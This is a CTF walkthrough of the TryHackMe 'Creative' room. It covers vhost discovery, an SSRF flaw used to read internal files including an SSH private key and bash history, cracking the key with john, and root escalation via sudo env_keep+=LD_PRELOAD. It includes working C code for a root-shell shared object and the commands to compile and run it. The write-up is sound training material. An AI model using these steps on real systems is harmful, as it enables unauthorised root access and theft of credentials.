---
title: TryHackMe | Creative Writeup 
date: 2026-05-17
categories: [TryHackMe]
tags: [web, ssrf, sudo]
image:
  path: assets/img/creative/creative-logo-bg.png
description: Exploiting a SSRF vulnerability to read local files, cracking an SSH key for initial access, and abusing env_keep+=LD_PRELOAD via sudo to achieve root access.
comments: true
---

## 1. Room Info
**Name:** Creative \\
**Platform:** TryHackMe \\
**Difficulty:** Easy \\
**OS:** Linux \\
**Link:** [Creative room on TryHackMe](https://tryhackme.com/room/creative)

## 2. Attack Path Summary
1. Discover the internal `beta.creative.thm` subdomain
2. Exploit an interactive SSRF flaw
3. Access root file system on port `1337`
4. Authenticate via SSH as `saad` user
5. Abuse `env_keep+=LD_PRELOAD` to gain root privileges

## 3. Reconnaissance
I started with a standard service scan to identify open ports.
```terminal
kali@kali:~/thm/creative$ nmap -p- -sV -sC <Target-IP> -oN nmap/initial.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-16 13:13 -0400
Nmap scan report for creative.thm (10.114.184.118)
Host is up (0.026s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8d:6c:56:6d:46:27:4b:e0:f4:a7:a0:84:10:9e:b1:52 (RSA)
|   256 df:e4:eb:2c:f2:88:a8:78:8a:e7:37:4b:5d:fb:99:32 (ECDSA)
|_  256 ab:2a:0b:7c:91:b3:92:ff:da:d4:9f:4a:29:51:68:65 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Open ports:
- 22 (SSH)
- 80 (HTTP – nginx 1.18.0)

Notice, the output shows that all other ports are **filtered**. This means firewall is blocking external access to everything except SSH (22) and Web (80). 

Add the following entry to `/etc/hosts`:
```
<Target-IP> creative.thm
```
## 4. Enumeration
Directory brute-forcing did not yield any viable attack vectors so I tried looking for virtual hosts / subdomains:
```bash
gobuster vhost -u http://creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
The scan revealed a hidded subdomain `beta.creative.thm`. To access it, add it to `/etc/hosts`.
![url tester subdomain](assets/img/creative/1-url-tester.png)
A URL tester. After submitting `http://127.0.0.1:80` in the input field, nginx returned a raw HTML of the homepage I saw at `http://creative.thm`.
![raw html](assets/img/creative/2-raw-html.png)

## 5. Vulnerability Analysis
Server-side request forgery (SSRF) is a web vulnerability that allows a user to force the application to make requests to unauthorized locations that the attacker normally wouldn't be able to reach directly. It can involve targeting either internal-only services of the organization's infrastructure or external malicious websites. 

Looking back at the `nmap` report, I knew there were potentially other ports open that the firewall disallowed external access to. Often if a request to a service comes from `localhost`, it is not blocked. So, I quickly tried a couple of common developer ports and found port `1337` available internally. Accessing `http://127.0.0.1:1337` revealed a root directory listing of the target machine.
![root dir](assets/img/creative/3-root-dir.png)
## 6. Exploitation
The user flag was located at`http://127.0.0.1:1337/home/saad/user.txt`.
![user flag](assets/img/creative/4-user-flag.png)

I also found a SSH private key of `saad` user at `http://127.0.0.1:1337/home/saad/.ssh/id_rsa`
![ssh key](assets/img/creative/5-ssh-key.png)

After properly saving the key, I extracted the hash and cracked it with `john`.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt     
```
Moreover, I found the user password for `saad` by inspecting `http://127.0.0.1:1337/home/saad/.bash_history`.
![saad password](assets/img/creative/6-saad-pass.png)

Note, SSH password authentication is completely disabled, so I gained the initial access using the previously obtained key.

## 7. Privilege Escalation
Thanks to the obtained password, checking `sudo` privileges of `saad` revealed the `LD_PRELOAD` misconfiguration.
```terminal
saad@ip-10-114-139-244:~$ sudo -l
Matching Defaults entries for saad on ip-10-114-139-244:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-114-139-244:
    (root) /usr/bin/ping
```
Sudo can be configured to inherit certain environment variables from the user's environment. By default, `env_reset` wipes/resets down to a bare minimum before every execution of the command via `sudo`. Here, however, `env_keep+=LD_PRELOAD` explicitly tells the system to keep the value of `LD_PRELOAD`. `LD_PRELOAD` instructs the system to load any shared object before any other program is executed - in this case, before running `/usr/bin/ping`. This also means that any malicious shared object that is being preloaded is run with `root` privileges. To exploit this misconfiguration, create a `.so` shell and preload it when executing `ping` with `sudo`. The following `C` code snippet wipes `LD_PRELOAD` to prevent infinite loop when executing `bash`, sets **Real, Effective, and Saved User IDs** to 0 (`root`) and calls `bash`.
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0, 0, 0);
        system("/bin/bash -p");
}
```
Compile it with:
```bash
gcc -fPIC -shared -nostartfiles -o preload.so preload.c
```
Run `ping` while specifying the full path to the compiled shared object in `LD_PRELOAD` parameter:
```bash
sudo LD_PRELOAD=/home/saad/preload.so /usr/bin/ping
```
![root flag](assets/img/creative/7-root-flag.png)